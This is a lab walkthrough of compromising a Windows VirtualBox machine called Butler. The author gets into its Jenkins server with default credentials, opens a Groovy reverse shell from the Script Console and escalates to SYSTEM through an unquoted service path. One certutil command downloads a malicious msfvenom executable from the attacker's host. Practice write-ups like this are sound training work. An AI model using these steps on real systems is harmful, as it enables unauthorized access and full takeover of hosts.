# Target Details

| IP            | Hostname/Box | Operating System /Platform |
| ------------- | ------------ | ---------------- |
| 192.168.1.109 | Butler          | Jenkins            |


# Box Outline
The purpose of this box was to exploit Jenkins, an online automation server/platform. After doing initial recon, port 8080 gave us the login page for the Jenkins platform. I brute forced the credentials using BurpSuite and gained access to the user "jenkins". "Script Console" is a plugin that Jenkins provides. It's functionality allows an authenticated user to upload/run groovy scripts that would be executed on the server. This feature was exploited and gave me low level privileges in the system via a reverse shell. I then used WinPeas to provide a complete picture of what the platform might be vulnerable against. One of the vulnerabilities was "Unquoted Service Path". This was exploited by uploading a malicious executable in the same folder as the targeted service. Once this was executed as the service, the malicious executable gave us a shell with system level privileges.
NOTE: This box, has multiple vulnerabilities. This was just one method of achieving root/system access

# Scanning and Enumeration
Ran `nmap -T4 -p- -A 192.168.109`
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -T4 -p- -A 192.168.1.109
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 16:19 EDT
Nmap scan report for 192.168.1.109
Host is up (0.00092s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.41.v20210516)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:12:FF:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h00m11s
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08002712ff7a (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-05T23:22:59
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 192.168.1.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.04 seconds
```

Exploring port 8080
![](port%208080%20-%20Jenkins%20login%20page.png)
**Background information**
	Jenkins is a self-contained, open source automation server which can be used to automate all sorts of tasks related to building, testing, and delivering or deploying software.
Google search jenkins exploits. Most of them elude to the fact that I'd need to have user access in order to perform a RCE.
Brute Force credentials
	In this walkthrough we used BurpSuite (Intruder). Keith provided a simple list of creds where username: jenkins and password: jenkins gave us access to the Jenkins dashboard
	*todo*: Brute force another way. Maybe with wordlists

![](jenkins%20dashboard.png)
Exploring the dashboard, Jenkins has a suite of built in tools. One of them is called "Script Console" that allows groovy scripts to be run and executed on the server.
![](Jenkins%20Script%20Console%20tool.png)
# Exploitation
Google search for groovy reverse shell script
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
![](TCM/5.%20Butler%20-%20completed/attachments/Reverse%20shell.png)
I set up the netcat listener on my attack box, and ran the script. A reverse shell was gained and low level priviliges were achieved.
![](TCM/5.%20Butler%20-%20completed/attachments/Netcat%20listener.png)

System Information
![](jenkins%20system%20info.png)
# Privilege Escalation
At this point, I'm in the system with low level privileges. In order to escalate the privileges I used a tool called winpeas. "Windows Privilege Escalation Awesome Scripts"
![](butler%20folders.png)

![](winpeas%20upload.png)
Once the winpeas was uploaded and ran. There was a slew of possible attack vectors. For the purpose of this box, we will focus on the job "WiseBootAssistant".  
![](Wise%20Boot%20Assistant.png)

Vulnerability: #Unquoted-service-path
	When a service is created whose executable path contains spaces and isn't enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which **allows a user to gain SYSTEM privileges** (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is)
One method of exploiting this is by replacing this service with a malicious executable. I created  a payload using msfvenom and named it Wise.exe. And also established another netcat listener
![](Wise.exe%20malicious%20executable%20for%20reverse%20shell.png)
1. Navigate to where the service is located/executed from `c:\Program Files (x86)\Wise` 
2. Executed the certutil.exe and transfer the malicious executable from the attack box to the target `certutil.exe -urlcache -f http://192.168.1.100/Wise.exe Wise.exe`. 
3. Stop the current WiseBootAssistant service, then restart it.
![](sc%20query%20WiseBootAssistant%20service.png)
Once the service started it executed the malicious executable and created a shell
![](2nd%20netcat%20listener%20with%20reverse%20shell%20with%20escalated%20privs.png)
# Post Exploitation
N/A